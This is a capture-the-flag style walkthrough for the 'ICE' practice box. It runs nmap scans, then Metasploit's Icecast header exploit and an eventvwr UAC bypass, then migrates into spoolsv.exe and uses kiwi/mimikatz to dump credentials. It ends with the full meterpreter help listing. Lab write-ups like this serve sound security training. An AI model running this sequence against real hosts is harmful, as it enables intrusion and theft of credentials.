# ICE

## Tools

- [Nmap](https://nmap.org/book/man-port-scanning-basics.html)  
- [Metasploit](https://docs.metasploit.com/)  
- [Mimikatz](https://github.com/ParrotSec/mimikatz)  

## Recon

```md
:> nmap -Pn -p- -r 10.67.129.227

Host is up (0.00038s latency).
Not shown: 65523 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
8000/tcp  open  http-alt
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown
49160/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 338.07 seconds
```

Initial port scan shows open ports  

Second is to scan for services and operating systems  

```md
:> nmap -Pn -p 135,139,445,3389,5357,8000 -sV -O 10.67.129.227

Starting Nmap 7.80 ( https://nmap.org ) at 2026-01-08 00:21 GMT
Nmap scan report for 10.67.129.227
Host is up (0.00045s latency).

PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  tcpwrapped
5357/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp open  http         Icecast streaming media server

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port

Aggressive OS guesses: Microsoft Windows Server 2008 SP1 (96%), Microsoft Windows 7 (96%), Microsoft Windows 7 SP0 - SP1 or Windows Server 2008 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (96%), Microsoft Windows 7 SP1 (96%), Microsoft Windows 7 Ultimate (96%), Microsoft Windows 8.1 (96%), Microsoft Windows Vista or Windows 7 SP1 (96%), Microsoft Windows Vista SP1 - SP2, Windows Server 2008 SP2, or Windows 7 (96%), Microsoft Windows Vista SP2 (96%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.29 seconds
```

Identify Potential Vulnerabilities:  

```md
nmap -Pn -p 135,139,445,3389,5357,8000 -sC 10.67.129.227
Starting Nmap 7.80 ( https://nmap.org ) at 2026-01-08 00:24 GMT
Nmap scan report for 10.67.129.227
Host is up (0.00050s latency).

PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi
8000/tcp open  http-alt
|_http-title: Site doesn't have a title (text/html).

Host script results:
|_clock-skew: mean: 1h59m59s, deviation: 3h27m50s, median: 0s
|_nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 12:a4:e9:44:21:d1 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Dark-PC
|   NetBIOS computer name: DARK-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-01-07T18:24:42-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-01-08T00:24:42
|_  start_date: 2026-01-07T23:59:26

Nmap done: 1 IP address (1 host up) scanned in 28.94 seconds
```

Two proofs of concept are publiced on Exploit-db.  

- [Luigi Auriemma](https://www.exploit-db.com/exploits/573)  

- [Metasploit](https://www.exploit-db.com/exploits/16763)  

## Gain Access

`:> msfconsole` to start the Metasploit Framework.  

`:> search icecast` to identify potential exploits.  

```md
msf6 > search icecast

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/icecast_header
```

`:> show options` to identify the needed settings  

![Show Options](/assets/ice-101.png)  

`:> set RHOSTS <TARGET IP>` to point Metasploit toward the target device  

![RHOSTS](/assets/ice-102.png)  

`:> run` to execute the exploit and received the meterpreter  

![Exploited](/assets/ice-103.png)  

## Escalate

`:> sysinfo` displys basic information about the system  

![System Information](/assets/ice-105.png)  

`:> ps` will identify currently running processes and other helpful information  

![Process List](/assets/ice-104.png)  

`:> run post/multi/recon/local_exploit_suggester` to identify other potential exploits available on this device  

![Post Exploit Detector](/assets/ice-106.png)  

`:> Ctrl + Z` to background the current session.  

`:> use exploit/windows/local/bypassuac_eventvwr` to activate the new exploit  

`:> show options` to set configurations  

`:> set SESSION 1`  

![Options Set](/assets/ice-107.png)  

`:> run` to execute the exploit  

![Session 2](/assets/ice-108.png)  

`:> getuid` to identify our current user.  

![getuid](/assets/ice-111.png)  

`:> getprivs` to see view current privileges  

![getprivs](/assets/ice-109.png)  

Review [Windows Special Privileges](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4672) to identify potentially helpful privileges.  

## Looting

`:> ps` to review the process list  

![Process List 2](/assets/ice-110.png)  

Manipulating the Windows Local Security Authority (lsass.exe) to dump the SAM entries.  This requires migration to a service allowing another shell with privileges sufficient to manipulate lsass. 

`:> migrate -N spoolsv.exe` to migrate to the spoolsv.exe  

![Migrate](/assets/ice-112.png)  

`:> getuid` to show the new user.  

![getuid 2](/assets/ice-113.png)  

`:> load kiwi` to load the mimikatz extension  

`:> creds_all` to dump the credentials from memory  

![creds_all](/assets/ice-114.png)  

Note: Both firewall and defender are disabled on this practice box, making this task much simpler.  

## Post-Exploitation

Additional Beneficial Commands:  

`:> help` to view a list of available commands  

```md
Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    detach                    Detach the meterpreter session (for http/https)
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session
    ssl_verify                Modify the SSL certificate verification setting
    transport                 Manage the transport mechanisms
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Stdapi: File system Commands
============================

    Command                   Description
    -------                   -----------
    cat                       Read the contents of a file to the screen
    cd                        Change directory
    checksum                  Retrieve the checksum of a file
    cp                        Copy source to destination
    del                       Delete the specified file
    dir                       List files (alias for ls)
    download                  Download a file or directory
    edit                      Edit a file
    getlwd                    Print local working directory (alias for lpwd)
    getwd                     Print working directory
    lcat                      Read the contents of a local file to the screen
    lcd                       Change local working directory
    ldir                      List local files (alias for lls)
    lls                       List local files
    lmkdir                    Create new directory on local machine
    lpwd                      Print local working directory
    ls                        List files
    mkdir                     Make directory
    mv                        Move source to destination
    pwd                       Print working directory
    rm                        Delete the specified file
    rmdir                     Remove directory
    search                    Search for files
    show_mount                List all mount points/logical drives
    upload                    Upload a file or directory


Stdapi: Networking Commands
===========================

    Command                   Description
    -------                   -----------
    arp                       Display the host ARP cache
    getproxy                  Display the current proxy configuration
    ifconfig                  Display interfaces
    ipconfig                  Display interfaces
    netstat                   Display the network connections
    portfwd                   Forward a local port to a remote service
    resolve                   Resolve a set of host names on the target
    route                     View and modify the routing table


Stdapi: System Commands
=======================

    Command                   Description
    -------                   -----------
    clearev                   Clear the event log
    drop_token                Relinquishes any active impersonation token.
    execute                   Execute a command
    getenv                    Get one or more environment variable values
    getpid                    Get the current process identifier
    getprivs                  Attempt to enable all privileges available to the current process
    getsid                    Get the SID of the user that the server is running as
    getuid                    Get the user that the server is running as
    kill                      Terminate a process
    localtime                 Displays the target system local date and time
    pgrep                     Filter processes by name
    pkill                     Terminate processes by name
    ps                        List running processes
    reboot                    Reboots the remote computer
    reg                       Modify and interact with the remote registry
    rev2self                  Calls RevertToSelf() on the remote machine
    shell                     Drop into a system command shell
    shutdown                  Shuts down the remote computer
    steal_token               Attempts to steal an impersonation token from the target process
    suspend                   Suspends or resumes a list of processes
    sysinfo                   Gets information about the remote system, such as OS


Stdapi: User interface Commands
===============================

    Command                   Description
    -------                   -----------
    enumdesktops              List all accessible desktops and window stations
    getdesktop                Get the current meterpreter desktop
    idletime                  Returns the number of seconds the remote user has been idle
    keyboard_send             Send keystrokes
    keyevent                  Send key events
    keyscan_dump              Dump the keystroke buffer
    keyscan_start             Start capturing keystrokes
    keyscan_stop              Stop capturing keystrokes
    mouse                     Send mouse events
    screenshare               Watch the remote user desktop in real time
    screenshot                Grab a screenshot of the interactive desktop
    setdesktop                Change the meterpreters current desktop
    uictl                     Control some of the user interface components


Stdapi: Webcam Commands
=======================

    Command                   Description
    -------                   -----------
    record_mic                Record audio from the default microphone for X seconds
    webcam_chat               Start a video chat
    webcam_list               List webcams
    webcam_snap               Take a snapshot from the specified webcam
    webcam_stream             Play a video stream from the specified webcam


Stdapi: Audio Output Commands
=============================

    Command                   Description
    -------                   -----------
    play                      play a waveform audio file (.wav) on the target system


Priv: Elevate Commands
======================

    Command                   Description
    -------                   -----------
    getsystem                 Attempt to elevate your privilege to that of local system.


Priv: Password database Commands
================================

    Command                   Description
    -------                   -----------
    hashdump                  Dumps the contents of the SAM database


Priv: Timestomp Commands
========================

    Command                   Description
    -------                   -----------
    timestomp                 Manipulate file MACE attributes


Kiwi Commands
=============

    Command                   Description
    -------                   -----------
    creds_all                 Retrieve all credentials (parsed)
    creds_kerberos            Retrieve Kerberos creds (parsed)
    creds_livessp             Retrieve Live SSP creds
    creds_msv                 Retrieve LM/NTLM creds (parsed)
    creds_ssp                 Retrieve SSP creds
    creds_tspkg               Retrieve TsPkg creds (parsed)
    creds_wdigest             Retrieve WDigest creds (parsed)
    dcsync                    Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm               Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create      Create a golden kerberos ticket
    kerberos_ticket_list      List all kerberos tickets (unparsed)
    kerberos_ticket_purge     Purge any in-use kerberos tickets
    kerberos_ticket_use       Use a kerberos ticket
    kiwi_cmd                  Execute an arbitrary mimikatz command (unparsed)
    lsa_dump_sam              Dump LSA SAM (unparsed)
    lsa_dump_secrets          Dump LSA secrets (unparsed)
    password_change           Change the password/hash of a user
    wifi_list                 List wifi profiles/creds for the current user
    wifi_list_shared          List shared wifi profiles/creds (requires SYSTEM)

For more info on a specific command, use <command> -h or help <command>.

```